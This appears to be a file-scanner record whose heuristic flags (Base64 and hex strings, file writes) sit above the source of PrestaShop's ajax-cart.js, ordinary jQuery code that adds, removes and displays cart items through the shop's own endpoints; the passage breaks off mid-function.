{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "write": "May write to a file"
        },
        "macro": "/*\n* 2007-2013 PrestaShop\n*\n* NOTICE OF LICENSE\n*\n* This source file is subject to the Academic Free License (AFL 3.0)\n* that is bundled with this package in the file LICENSE.txt.\n* It is also available through the world-wide-web at this URL:\n* http://opensource.org/licenses/afl-3.0.php\n* If you did not receive a copy of the license and are unable to\n* obtain it through the world-wide-web, please send an email\n* to license@prestashop.com so we can send you a copy immediately.\n*\n* DISCLAIMER\n*\n* Do not edit or add to this file if you wish to upgrade PrestaShop to newer\n* versions in the future. If you wish to customize PrestaShop for your\n* needs please refer to http://www.prestashop.com for more information.\n*\n*  @author PrestaShop SA <contact@prestashop.com>\n*  @copyright  2007-2013 PrestaShop SA\n*  @license    http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)\n*  International Registered Trademark & Property of PrestaShop SA\n*/\n\n// Retrocompatibility with 1.4\nif (typeof baseUri === \"undefined\" && typeof baseDir !== \"undefined\")\n\tbaseUri = baseDir;\n\n//JS Object : update the cart by ajax actions\nvar ajaxCart = {\n\tnb_total_products: 0,\n\n\t//override every button in the page in relation to the cart\n\toverrideButtonsInThePage : function(){\n\t\t//for every 'add' buttons...\n\t\t$('.ajax_add_to_cart_button').unbind('click').click(function(){\n\t\t\tvar idProduct =  $(this).attr('rel').replace('nofollow', '').replace('ajax_id_product_', '');\n\t\t\tif ($(this).attr('disabled') != 'disabled')\n\t\t\t\tajaxCart.add(idProduct, null, false, this);\n\t\t\treturn false;\n\t\t});\n\t\t//for product page 'add' button...\n\t\t$('#add_to_cart input').unbind('click').click(function(){\n\t\t\tajaxCart.add( $('#product_page_product_id').val(), $('#idCombination').val(), true, null, $('#quantity_wanted').val(), null);\n\t\t\treturn false;\n\t\t});\n\n\t\t//for 'delete' buttons in the cart block...\n\t\t$('#cart_block_list .ajax_cart_block_remove_link').unbind('click').click(function(){\n\t\t\t// Customized product management\n\t\t\tvar customizationId = 0;\n\t\t\tvar productId = 0;\n\t\t\tvar productAttributeId = 0;\n\t\t\tvar customizableProductDiv = $($(this).parent().parent()).find(\"div[id^=deleteCustomizableProduct_]\");\n\n\t\t\tif (customizableProductDiv && $(customizableProductDiv).length)\n\t\t\t{\n\t\t\t\t$(customizableProductDiv).each(function(){\n\t\t\t\t\tvar ids = $(this).attr('id').split('_');\n\t\t\t\t\tif (typeof(ids[1]) != 'undefined')\n\t\t\t\t\t{\n\t\t\t\t\t\tcustomizationId = parseInt(ids[1]);\n\t\t\t\t\t\tproductId = parseInt(ids[2]);\n\t\t\t\t\t\tif (typeof(ids[3]) != 'undefined')\n\t\t\t\t\t\t\tproductAttributeId = parseInt(ids[3]);\n\t\t\t\t\t\treturn false;\n\t\t\t\t\t}\n\t\t\t\t});\n\t\t\t}\n\n\t\t\t// Common product management\n\t\t\tif (!customizationId)\n\t\t\t{\n\t\t\t\t//retrieve idProduct and idCombination from the displayed product in the block cart\n\t\t\t\tvar firstCut = $(this).parent().parent().attr('id').replace('cart_block_product_', '');\n\t\t\t\tfirstCut = firstCut.replace('deleteCustomizableProduct_', '');\n\t\t\t\tids = firstCut.split('_');\n\t\t\t\tproductId = parseInt(ids[0]);\n\t\t\t\tif (typeof(ids[1]) != 'undefined')\n\t\t\t\t\tproductAttributeId = parseInt(ids[1]);\n\t\t\t}\n\n\t\t\tvar idAddressDelivery = $(this).parent().parent().attr('id').match(/.*_\\d+_\\d+_(\\d+)/)[1];\n\n\t\t\t// Removing product from the cart\n\t\t\tajaxCart.remove(productId, productAttributeId, customizationId, idAddressDelivery);\n\t\t\treturn false;\n\t\t});\n\t},\n\n\t// try to expand the cart\n\texpand : function(){\n\t\tif ($('#cart_block_list').hasClass('collapsed'))\n\t\t{\n\t\t\t$('#cart_block_summary').slideUp(200, function(){\n\t\t\t\t$(this).addClass('collapsed').removeClass('expanded');\n\t\t\t\t$('#cart_block_list').slideDown({\n\t\t\t\t\tduration: 450,\n\t\t\t\t\tcomplete: function(){$(this).addClass('expanded').removeClass('collapsed');}\n\t\t\t\t});\n\t\t\t});\n\t\t\t// toogle the button expand/collapse button\n\t\t\t$('#block_cart_expand').fadeOut('slow', function(){\n\t\t\t\t$('#block_cart_collapse').fadeIn('fast');\n\t\t\t});\n\n\t\t\t// save the expand statut in the user cookie\n\t\t\t$.ajax({\n\t\t\t\ttype: 'POST',\n\t\t\t\theaders: { \"cache-control\": \"no-cache\" },\n\t\t\t\turl: baseDir + 'modules/blockcart/blockcart-set-collapse.php' + '?rand=' + new Date().getTime(),\n\t\t\t\tasync: true,\n\t\t\t\tcache: false,\n\t\t\t\tdata: 'ajax_blockcart_display=expand'\n\t\t\t});\n\n\n\t\t}\n\t},\n\t// Fix display when using back and previous browsers buttons\n\trefresh : function(){\n\t\t$.ajax({\n\t\t\ttype: 'POST',\n\t\t\theaders: { \"cache-control\": \"no-cache\" },\n\t\t\turl: baseUri + '?rand=' + new Date().getTime(),\n\t\t\tasync: true,\n\t\t\tcache: false,\n\t\t\tdataType : \"json\",\n\t\t\tdata: 'controller=cart&ajax=true&token=' + static_token,\n\t\t\tsuccess: function(jsonData)\n\t\t\t{\n\t\t\t\tajaxCart.updateCart(jsonData);\n\t\t\t}\n\t\t});\n\t},\n\n\t// try to collapse the cart\n\tcollapse : function(){\n\n\t\tif ($('#cart_block_list').hasClass('expanded'))\n\t\t{\n\t\t\t$('#cart_block_list').slideUp('slow', function(){\n\t\t\t\t$(this).addClass('collapsed').removeClass('expanded');\n\t\t\t\t$('#cart_block_summary').slideDown(450, function(){\n\t\t\t\t\t$(this).addClass('expanded').removeClass('collapsed');\n\t\t\t\t});\n\t\t\t});\n\t\t\t$('#block_cart_collapse').fadeOut('slow', function(){\n\t\t\t\t$('#block_cart_expand').fadeIn('fast');\n\t\t\t});\n\n\t\t\t// save the expand statut in the user cookie\n\t\t\t$.ajax({\n\t\t\t\ttype: 'POST',\n\t\t\t\theaders: { \"cache-control\": \"no-cache\" },\n\t\t\t\turl: baseDir + 'modules/blockcart/blockcart-set-collapse.php' + '?rand=' + new Date().getTime(),\n\t\t\t\tasync: true,\n\t\t\t\tcache: false,\n\t\t\t\tdata: 'ajax_blockcart_display=collapse' + '&rand=' + new Date().getTime()\n\t\t\t});\n\t\t}\n\t},\n\n\t// Update the cart information\n\tupdateCartInformation : function (jsonData, addedFromProductPage)\n\t{\n\t\tajaxCart.updateCart(jsonData);\n\n\t\t//reactive the button when adding has finished\n\t\tif (addedFromProductPage)\n\t\t\t$('#add_to_cart input').removeAttr('disabled').addClass('exclusive').removeClass('exclusive_disabled');\n\t\telse\n\t\t\t$('.ajax_add_to_cart_button').removeAttr('disabled');\n\t},\n\n\t// add a product in the cart via ajax\n\tadd : function(idProduct, idCombination, addedFromProductPage, callerElement, quantity, whishlist){\n\t\tif (addedFromProductPage && !checkCustomizations())\n\t\t{\n\t\t\talert(fieldRequired);\n\t\t\treturn ;\n\t\t}\n\t\temptyCustomizations();\n\t\t//disabled the button when adding to not double add if user double click\n\t\tif (addedFromProductPage)\n\t\t{\n\t\t\t$('#add_to_cart input').attr('disabled', true).removeClass('exclusive').addClass('exclusive_disabled');\n\t\t\t$('.filled').removeClass('filled');\n\t\t}\n\t\telse\n\t\t\t$(callerElement).attr('disabled', true);\n\n\t\tif ($('#cart_block_list').hasClass('collapsed'))\n\t\t\tthis.expand();\n\t\t//send the ajax request to the server\n\t\t$.ajax({\n\t\t\ttype: 'POST',\n\t\t\theaders: { \"cache-control\": \"no-cache\" },\n\t\t\turl: baseUri + '?rand=' + new Date().getTime(),\n\t\t\tasync: true,\n\t\t\tcache: false,\n\t\t\tdataType : \"json\",\n\t\t\tdata: 'controller=cart&add=1&ajax=true&qty=' + ((quantity && quantity != null) ? quantity : '1') + '&id_product=' + idProduct + '&token=' + static_token + ( (parseInt(idCombination) && idCombination != null) ? '&ipa=' + parseInt(idCombination): ''),\n\t\t\tsuccess: function(jsonData,textStatus,jqXHR)\n\t\t\t{\n\t\t\t\t// add appliance to whishlist module\n\t\t\t\tif (whishlist && !jsonData.errors)\n\t\t\t\t\tWishlistAddProductCart(whishlist[0], idProduct, idCombination, whishlist[1]);\n\n\t\t\t\t// add the picture to the cart\n\t\t\t\tvar $element = $(callerElement).parent().parent().find('a.product_image img,a.product_img_link img');\n\t\t\t\tif (!$element.length)\n\t\t\t\t\t$element = $('#bigpic');\n\t\t\t\tvar $picture = $element.clone();\n\t\t\t\tvar pictureOffsetOriginal = $element.offset();\n\t\t\t\tpictureOffsetOriginal.right = $(window).innerWidth() - pictureOffsetOriginal.left - $element.width();\n\n\t\t\t\tif ($picture.length)\n\t\t\t\t{\n\t\t\t\t\t$picture.css({\n\t\t\t\t\t\tposition: 'absolute',\n\t\t\t\t\t\ttop: pictureOffsetOriginal.top,\n\t\t\t\t\t\tright: pictureOffsetOriginal.right\n\t\t\t\t\t});\n\t\t\t\t}\n\n\t\t\t\tvar pictureOffset = $picture.offset();\n\t\t\t\tvar cartBlock = $('#cart_block');\n\t\t\t\tif (!$('#cart_block')[0] || !$('#cart_block').offset().top || !$('#cart_block').offset().left)\n\t\t\t\t\tcartBlock = $('#shopping_cart');\n\t\t\t\tvar cartBlockOffset = cartBlock.offset();\n\t\t\t\tcartBlockOffset.right = $(window).innerWidth() - cartBlockOffset.left - cartBlock.width();\n\n\t\t\t\t// Check if the block cart is activated for the animation\n\t\t\t\tif (cartBlockOffset != undefined && $picture.length)\n\t\t\t\t{\n\t\t\t\t\t$picture.appendTo('body');\n\t\t\t\t\t$picture\n\t\t\t\t\t\t.css({\n\t\t\t\t\t\t\tposition: 'absolute',\n\t\t\t\t\t\t\ttop: pictureOffsetOriginal.top,\n\t\t\t\t\t\t\tright: pictureOffsetOriginal.right,\n\t\t\t\t\t\t\tzIndex: 4242\n\t\t\t\t\t\t})\n\t\t\t\t\t\t.animate({\n\t\t\t\t\t\t\twidth: $element.attr('width')*0.66,\n\t\t\t\t\t\t\theight: $element.attr('height')*0.66,\n\t\t\t\t\t\t\topacity: 0.2,\n\t\t\t\t\t\t\ttop: cartBlockOffset.top + 30,\n\t\t\t\t\t\t\tright: cartBlockOffset.right + 15\n\t\t\t\t\t\t}, 1000)\n\t\t\t\t\t\t.fadeOut(100, function() {\n\t\t\t\t\t\t\tajaxCart.updateCartInformation(jsonData, addedFromProductPage);\n\t\t\t\t\t\t\t$(this).remove();\n\t\t\t\t\t\t});\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t\tajaxCart.updateCartInformation(jsonData, addedFromProductPage);\n\t\t\t},\n\t\t\terror: function(XMLHttpRequest, textStatus, errorThrown)\n\t\t\t{\n\t\t\t\talert(\"Impossible to add the product to the cart.\\n\\ntextStatus: '\" + textStatus + \"'\\nerrorThrown: '\" + errorThrown + \"'\\nresponseText:\\n\" + XMLHttpRequest.responseText);\n\t\t\t\t//reactive the button when adding has finished\n\t\t\t\tif (addedFromProductPage)\n\t\t\t\t\t$('#add_to_cart input').removeAttr('disabled').addClass('exclusive').removeClass('exclusive_disabled');\n\t\t\t\telse\n\t\t\t\t\t$(callerElement).removeAttr('disabled');\n\t\t\t}\n\t\t});\n\t},\n\n\t//remove a product from the cart via ajax\n\tremove : function(idProduct, idCombination, customizationId, idAddressDelivery){\n\t\t//send the ajax request to the server\n\t\t$.ajax({\n\t\t\ttype: 'POST',\n\t\t\theaders: { \"cache-control\": \"no-cache\" },\n\t\t\turl: baseUri + '?rand=' + new Date().getTime(),\n\t\t\tasync: true,\n\t\t\tcache: false,\n\t\t\tdataType : \"json\",\n\t\t\tdata: 'controller=cart&delete=1&id_product=' + idProduct + '&ipa=' + ((idCombination != null && parseInt(idCombination)) ? idCombination : '') + ((customizationId && customizationId != null) ? '&id_customization=' + customizationId : '') + '&id_address_delivery=' + idAddressDelivery + '&token=' + static_token + '&ajax=true',\n\t\t\tsuccess: function(jsonData)\t{\n\t\t\t\tajaxCart.updateCart(jsonData);\n\t\t\t\tif ($('body').attr('id') == 'order' || $('body').attr('id') == 'order-opc')\n\t\t\t\t\tdeleteProductFromSummary(idProduct+'_'+idCombination+'_'+customizationId+'_'+idAddressDelivery);\n\t\t\t},\n\t\t\terror: function() {alert('ERROR: unable to delete the product');}\n\t\t});\n\t},\n\n\t//hide the products displayed in the page but no more in the json data\n\thideOldProducts : function(jsonData) {\n\t\t//delete an eventually removed product of the displayed cart (only if cart is not empty!)\n\t\tif ($('#cart_block_list dl.products').length > 0)\n\t\t{\n\t\t\tvar removedProductId = null;\n\t\t\tvar removedProductData = null;\n\t\t\tvar removedProductDomId = null;\n\t\t\t//look for a product to delete...\n\t\t\t$('#cart_block_list dl.products dt').each(function(){\n\t\t\t\t//retrieve idProduct and idCombination from the displayed product in the block cart\n\t\t\t\tvar domIdProduct = $(this).attr('id');\n\t\t\t\tvar firstCut =  domIdProduct.replace('cart_block_product_', '');\n\t\t\t\tvar ids = firstCut.split('_');\n\n\t\t\t\t//try to know if the current product is still in the new list\n\t\t\t\tvar stayInTheCart = false;\n\t\t\t\tfor (aProduct in jsonData.products)\n\t\t\t\t{\n\t\t\t\t\t//we've called the variable aProduct because IE6 bug if this variable is called product\n\t\t\t\t\t//if product has attributes\n\t\t\t\t\tif (jsonData.products[aProduct]['id'] == ids[0] && (!ids[1] || jsonData.products[aProduct]['idCombination'] == ids[1]))\n\t\t\t\t\t{\n\t\t\t\t\t\tstayInTheCart = true;\n\t\t\t\t\t\t// update the product customization display (when the product is still in the cart)\n\t\t\t\t\t\tajaxCart.hideOldProductCustomizations(jsonData.products[aProduct], domIdProduct);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t//remove product if it's no more in the cart\n\t\t\t\tif (!stayInTheCart)\n\t\t\t\t{\n\t\t\t\t\tremovedProductId = $(this).attr('id');\n\t\t\t\t\tif (removedProductId != null)\n\t\t\t\t\t{\n\t\t\t\t\t\tvar firstCut =  removedProductId.replace('cart_block_product_', '');\n\t\t\t\t\t\tvar ids = firstCut.split('_');\n\n\t\t\t\t\t\t$('#'+removedProductId).addClass('strike').fadeTo('slow', 0, function(){\n\t\t\t\t\t\t\t$(this).slideUp('slow', function(){\n\t\t\t\t\t\t\t\t$(this).remove();\n\t\t\t\t\t\t\t\t// If the cart is now empty, show the 'no product in the cart' message and close detail\n\t\t\t\t\t\t\t\tif($('#cart_block dl.products dt').length == 0)\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t$(\"#cart_block\").stop(true, true).slideUp(200);\n\t\t\t\t\t\t\t\t\t$('#cart_block_no_products:hidden').slideDown(450);\n\t\t\t\t\t\t\t\t\t$('#cart_block dl.products').remove();\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\t\t\t\t\t\t});\n\t\t\t\t\t\t$('#cart_block_combination_of_' + ids[0] + (ids[1] ? '_'+ids[1] : '') + (ids[2] ? '_'+ids[2] : '')).fadeTo('fast', 0, function(){\n\t\t\t\t\t\t\t$(this).slideUp('fast', function(){\n\t\t\t\t\t\t\t\t$(this).remove();\n\t\t\t\t\t\t\t});\n\t\t\t\t\t\t});\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t});\n\t\t}\n\t},\n\n\thideOldProductCustomizations : function (product, domIdProduct)\n\t{\n\t\tvar customizationList = $('#customization_' + product['id'] + '_' + product['idCombination']);\n\t\tif(customizationList.length > 0)\n\t\t{\n\t\t\t$(customizationList).find(\"li\").each(function(){\n\t\t\t\t$(this).find(\"div\").each(function() {\n\t\t\t\t\tvar customizationDiv = $(this).attr('id');\n\t\t\t\t\tvar tmp = customizationDiv.replace('deleteCustomizableProduct_', '');\n\t\t\t\t\tvar ids = tmp.split('_');\n\t\t\t\t\tif ((parseInt(product.idCombination) == parseInt(ids[2])) && !ajaxCart.doesCustomizationStillExist(product, ids[0]))\n\t\t\t\t\t\t$('#' + customizationDiv).parent().addClass('strike').fadeTo('slow', 0, function(){\n\t\t\t\t\t\t\t$(this).slideUp('slow');\n\t\t\t\t\t\t\t$(this).remove();\n\t\t\t\t\t\t});\n\t\t\t\t});\n\t\t\t});\n\t\t}\n\n\t\tvar removeLinks = $('#' + domIdProduct).find('.ajax_cart_block_remove_link');\n\t\tif (!product.hasCustomizedDatas && !removeLinks.length)\n\t\t\t$('#' + domIdProduct + ' span.remove_link').html('<a class=\"ajax_cart_block_remove_link\" rel=\"nofollow\" href=\"' + baseUri + '?controller=cart&amp;delete=1&amp;id_product=' + product['id'] + '&amp;ipa=' + product['idCombination'] + '&amp;token=' + static_token + '\"> </a>');\n\t\tif (product.is_gift)\n\t\t\t$('#' + domIdProduct + ' span.remove_link').html('');\n\t},\n\n\tdoesCustomizationStillExist : function (product, customizationId)\n\t{\n\t\tvar exists = false;\n\n\t\t$(product.customizedDatas).each(function() {\n\t\t\tif (this.customizationId == customizationId)\n\t\t\t{\n\t\t\t\texists = true;\n\t\t\t\t// This return does not mean that we found nothing but simply break the loop\n\t\t\t\treturn false;\n\t\t\t}\n\t\t});\n\t\treturn (exists);\n\t},\n\n\t//refresh display of vouchers (needed for vouchers in % of the total)\n\trefreshVouchers : function (jsonData) {\n\t\tif (typeof(jsonData.discounts) == 'undefined' || jsonData.discounts.length == 0)\n\t\t\t$('#vouchers').hide();\n\t\telse\n\t\t{\n\t\t\t$('#vouchers tbody').html('');\n\t\t\tfor (i=0; i < jsonData.discounts.length; i++)\n\t\t\t{\n\t\t\t\tif (parseFloat(jsonData.discounts[i].price_float) > 0)\n\t\t\t\t{\n\t\t\t\t\tvar delete_link = '';\n\t\t\t\t\tif (jsonData.discounts[i].code.length)\n\t\t\t\t\t\tdelete_link = '<a class=\"delete_voucher\" href=\"'+jsonData.discounts[i].link+'\" title=\"'+delete_txt+'\"><img src=\"'+img_dir+'icon/delete.gif\" alt=\"'+delete_txt+'\" class=\"icon\" /></a>';\n\t\t\t\t\t$('#vouchers tbody').append($(\n\t\t\t\t\t\t'<tr class=\"bloc_cart_voucher\" id=\"bloc_cart_voucher_'+jsonData.discounts[i].id+'\">'\n\t\t\t\t\t\t+ '<td class=\"quantity\">1x</td>'\n\t\t\t\t\t\t+ '<td class=\"name\" title=\"'+jsonData.discounts[i].description+'\">'+jsonData.discounts[i].name+'</td>'\n\t\t\t\t\t\t+ '<td class=\"price\">-'+jsonData.discounts[i].price+'</td>'\n\t\t\t\t\t\t+ '<td class=\"delete\">' + delete_link + '</td>'\n\t\t\t\t\t\t+ '</tr>'\n\t\t\t\t\t));\n\t\t\t\t}\n\t\t\t}\n\t\t\t$('#vouchers').show();\n\t\t}\n\n\t},\n\n\t// Update product quantity\n\tupdateProductQuantity : function (product, quantity) {\n\n\t\t$('#cart_block_product_' + product.id + '_' + (product.idCombination ? product.idCombination : '0')+ '_' + (product.idAddressDelivery ? product.idAddressDelivery : '0') + ' .quantity').fadeTo('fast', 0, function() {\n\t\t\t$(this).text(quantity);\n\t\t\t$(this).fadeTo('fast', 1, function(){\n\t\t\t\t$(this).fadeTo('fast', 0, function(){\n\t\t\t\t\t$(this).fadeTo('fast', 1, function(){\n\t\t\t\t\t\t$(this).fadeTo('fast', 0, function(){\n\t\t\t\t\t\t\t$(this).fadeTo('fast', 1);\n\t\t\t\t\t\t});\n\t\t\t\t\t});\n\t\t\t\t});\n\t\t\t});\n\t\t});\n\t},\n\n\n\t//display the products witch are in json data but not already displayed\n\tdisplayNewProducts : function(jsonData) {\n\n\t\t//add every new products or update displaying of every updated products\n\t\t$(jsonData.products).each(function(){\n\t\t\t//fix ie6 bug (one more item 'undefined' in IE6)\n\t\t\tif (this.id != undefined)\n\t\t\t{\n\t\t\t\t//create a container for listing the products and hide the 'no product in the cart' message (only if the cart was empty)\n\n\t\t\t\tif ($('#cart_block dl.products').length == 0)\n\t\t\t\t{\n\t\t\t\t\t$('#cart_block_no_products').before('<dl class=\"products\"></dl>');\n\t\t\t\t\t$('#cart_block_no_products').hide();\n\t\t\t\t}\n\t\t\t\t//if product is not in the displayed cart, add a new product's line\n\t\t\t\tvar domIdProduct = this.id + '_' + (this.idCombination ? this.idCombination : '0') + '_' + (this.idAddressDelivery ? this.idAddressDelivery : '0');\n\t\t\t\tvar domIdProductAttribute = this.id + '_' + (this.idCombination ? this.idCombination : '0');\n\t\t\t\tif ($('#cart_block_product_'+ domIdProduct).length == 0)\n\t\t\t\t{\n\t\t\t\t\tvar productId = parseInt(this.id);\n\t\t\t\t\tvar productAttributeId = (this.hasAttributes ? parseInt(this.attributes) : 0);\n\t\t\t\t\tvar content =  '<dt class=\"hidden\" id=\"cart_block_product_' + domIdProduct + '\">';\n\t\t\t\t\tcontent += '<span class=\"quantity-formated\"><span class=\"quantity\">' + this.quantity + '</span>x</span>';\n\t\t\t\t\tvar min = this.name.indexOf(';', 10);\n\t\t\t\t\tvar name = (this.name.length > 12 ? this.name.substring(0, ((min - 10) <= 7) ? min : 10) + '...' : this.name);\n\t\t\t\t\tcontent += '<a href=\"' + this.link + '\" title=\"' + this.name + '\" class=\"cart_block_product_name\">' + name + '</a>';\n\n\t\t\t\t\tif (typeof(this.is_gift) == 'undefined' || this.is_gift == 0)\n\t\t\t\t\t\tcontent += '<span class=\"remove_link\"><a rel=\"nofollow\" class=\"ajax_cart_block_remove_link\" href=\"' + baseUri + '?controller=cart&amp;delete=1&amp;id_product=' + productId + '&amp;token=' + static_token + (this.hasAttributes ? '&amp;ipa=' + parseInt(this.idCombination) : '') + '\"> </a></span>';\n\t\t\t\t\telse\n\t\t\t\t\t\tcontent += '<span class=\"remove_link\"></span>';\n\t\t\t\t\tif (typeof(freeProductTranslation) != 'undefined')\n\t\t\t\t\t\tcontent += '<span class=\"price\">' + (parseFloat(this.price_float) > 0 ? this.priceByLine : freeProductTranslation) + '</span>';\n\t\t\t\t\tcontent += '</dt>';\n\t\t\t\t\tif (this.hasAttributes)\n\t\t\t\t\t\t  content += '<dd id=\"cart_block_combination_of_' + domIdProduct + '\" class=\"hidden\"><a href=\"' + this.link + '\" title=\"' + this.name + '\">' + this.attributes + '</a>';\n\t\t\t\t\tif (this.hasCustomizedDatas)\n\t\t\t\t\t\tcontent += ajaxCart.displayNewCustomizedDatas(this);\n\t\t\t\t\tif (this.hasAttributes) content += '</dd>';\n\n\t\t\t\t\t$('#cart_block dl.products').append(content);\n\t\t\t\t}\n\t\t\t\t//else update the product's line\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tvar jsonProduct = this;\n\t\t\t\t\tif($.trim($('#cart_block_product_' + domIdProduct + ' .quantity').html()) != jsonProduct.quantity || $.trim($('#cart_block_product_' + domIdProduct + ' .price').html()) != jsonProduct.priceByLine)\n\t\t\t\t\t{\n\t\t\t\t\t\t// Usual product\n\t\t\t\t\t\tif (!this.is_gift)\n\t\t\t\t\t\t\t$('#cart_block_product_' + domIdProduct + ' .price').text(jsonProduct.priceByLine);\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\t$('#cart_block_product_' + domIdProduct + ' .price').html(freeProductTranslation);\n\t\t\t\t\t\tajaxCart.updateProductQuantity(jsonProduct, jsonProduct.quantity);\n\n\t\t\t\t\t\t// Customized product\n\t\t\t\t\t\tif (jsonProduct.hasCustomizedDatas)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tcustomizationFormatedDatas = ajaxCart.displayNewCustomizedDatas(jsonProduct);\n\t\t\t\t\t\t\tif (!$('#customization_' + domIdProductAttribute).length)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tif (jsonProduct.hasAttributes)\n\t\t\t\t\t\t\t\t\t$('#cart_block_combination_of_' + domIdProduct).append(customizationFormatedDatas);\n\t\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\t\t$('#cart_block dl.products').append(customizationFormatedDatas);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t$('#customization_' + domIdProductAttribute).html('');\n\t\t\t\t\t\t\t\t$('#customization_' + domIdProductAttribute).append(customizationFormatedDatas);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t$('#cart_block dl.products .hidden').slideDown(450).removeClass('hidden');\n\n\t\t\tvar removeLinks = $('#cart_block_product_' + domIdProduct).find('a.ajax_cart_block_remove_link');\n\t\t\tif (this.hasCustomizedDatas && removeLinks.length)\n\t\t\t\t$(removeLinks).each(function() {\n\t\t\t\t\t$(this).remove();\n\t\t\t\t});\n\t\t\t}\n\t\t});\n\t},\n\n\tdisplayNewCustomizedDatas : function(product)\n\t{\n\t\tvar content = '';\n\t\tvar productId = parseInt(product.id);\n\t\tvar productAttributeId = typeof(product.idCombination) == 'undefined' ? 0 : parseInt(product.idCombination);\n\t\tvar hasAlreadyCustomizations = $('#customization_' + productId + '_' + productAttributeId).length;\n\n\t\tif (!hasAlreadyCustomizations)\n\t\t{\n\t\t\tif (!product.hasAttributes)\n\t\t\t\tcontent += '<dd id=\"cart_block_combination_of_' + productId + '\" class=\"hidden\">';\n\t\t\tif ($('#customization_' + productId + '_' + productAttributeId).val() == undefined)\n\t\t\t\tcontent += '<ul class=\"cart_block_customizations\" id=\"customization_' + productId + '_' + productAttributeId + '\">';\n\t\t}\n\n\t\t$(product.customizedDatas).each(function()\n\t\t{\n\t\t\tvar done = 0;\n\t\t\tcustomizationId = parseInt(this.customizationId);\n\t\t\tproductAttributeId = typeof(product.idCombination) == 'undefined' ? 0 : parseInt(product.idCombination);\n\t\t\tcontent += '<li name=\"customization\"><div class=\"deleteCustomizableProduct\" id=\"deleteCustomizableProduct_' + customizationId + '_' + productId + '_' + (productAttributeId ?  productAttributeId : '0') + '\"><a rel=\"nofollow\" class=\"ajax_cart_block_remove_link\" href=\"' + baseUri + '?controller=cart&amp;delete=1&amp;id_product=' + productId + '&amp;ipa=' + productAttributeId + '&amp;id_customization=' + customizationId + '&amp;token=' + static_token + '\"></a></div><span class=\"quantity-formated\"><span class=\"quantity\">' + parseInt(this.quantity) + '</span>x</span>';\n\n\t\t\t// Give to the customized product the first textfield value as name\n\t\t\t$(this.datas).each(function(){\n\t\t\t\tif (this['type'] == CUSTOMIZE_TEXTFIELD)\n\t\t\t\t{\n\t\t\t\t\t$(this.datas).each(function(){\n\t\t\t\t\t\tif (this['index'] == 0)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tcontent += ' ' + this.truncatedValue.replace(/<br \\/>/g, ' ');\n\t\t\t\t\t\t\tdone = 1;\n\t\t\t\t\t\t\treturn false;\n\t\t\t\t\t\t}\n\t\t\t\t\t})\n\t\t\t\t}\n\t\t\t});\n\n\t\t\t// If the customized product did not have any textfield, it will have the customizationId as name\n\t\t\tif (!done)\n\t\t\t\tcontent += customizationIdMessage + customizationId;\n\t\t\tif (!hasAlreadyCustomizations) content += '</li>';\n\t\t\t// Field cleaning\n\t\t\tif (customizationId)\n\t\t\t{\n\t\t\t\t$('#uploadable_files li div.customizationUploadBrowse img').remove();\n\t\t\t\t$('#text_fields input').attr('value', '');\n\t\t\t}\n\t\t});\n\n\t\tif (!hasAlreadyCustomizations)\n\t\t{\n\t\t\tcontent += '</ul>';\n\t\t\tif (!product.hasAttributes) content += '</dd>';\n\t\t}\n\t\treturn (content);\n\t},\n\n\n\t//genarally update the display of the cart\n\tupdateCart : function(jsonData) {\n\t\t//user errors display\n\t\tif (jsonData.hasError)\n\t\t{\n\t\t\tvar errors = '';\n\t\t\tfor (error in jsonData.errors)\n\t\t\t\t//IE6 bug fix\n\t\t\t\tif (error != 'indexOf')\n\t\t\t\t\terrors += $('<div />').html(jsonData.errors[error]).text() + \"\\n\";\n\t\t\talert(errors);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tajaxCart.updateCartEverywhere(jsonData);\n\t\t\tajaxCart.hideOldProducts(jsonData);\n\t\t\tajaxCart.displayNewProducts(jsonData);\n\t\t\tajaxCart.refreshVouchers(jsonData);\n\n\t\t\t//update 'first' and 'last' item classes\n\t\t\t$('#cart_block .products dt').removeClass('first_item').removeClass('last_item').removeClass('item');\n\t\t\t$('#cart_block .products dt:first').addClass('first_item');\n\t\t\t$('#cart_block .products dt:not(:first,:last)').addClass('item');\n\t\t\t$('#cart_block .products dt:last').addClass('last_item');\n\n\t\t\t//reset the onlick events in relation to the cart block (it allow to bind the onclick event to the new 'delete' buttons added)\n\t\t\tajaxCart.overrideButtonsInThePage();\n\t\t}\n\t},\n\n\t//update general cart informations everywhere in the page\n\tupdateCartEverywhere : function(jsonData) {\n\t\t$('.ajax_cart_total').text($.trim(jsonData.productTotal));\n\n\t\tif (parseFloat(jsonData.shippingCostFloat) > 0 || jsonData.nbTotalProducts < 1)\n\t\t\t$('.ajax_cart_shipping_cost').text(jsonData.shippingCost);\n\t\telse if (typeof(freeShippingTranslation) != 'undefined')\n\t\t\t\t$('.ajax_cart_shipping_cost').html(freeShippingTranslation);\n\t\t$('.ajax_cart_tax_cost').text(jsonData.taxCost);\n\t\t$('.cart_block_wrapping_cost').text(jsonData.wrappingCost);\n\t\t$('.ajax_block_cart_total').text(jsonData.total);\n\n\t\tthis.nb_total_products = jsonData.nbTotalProducts;\n\n\t\tif (parseInt(jsonData.nbTotalProducts) > 0)\n\t\t{\n\t\t\t$('.ajax_cart_no_product').hide();\n\t\t\t$('.ajax_cart_quantity').text(jsonData.nbTotalProducts);\n\t\t\t$('.ajax_cart_quantity').fadeIn('slow');\n\t\t\t$('.ajax_cart_total').fadeIn('slow');\n\n\t\t\tif (parseInt(jsonData.nbTotalProducts) > 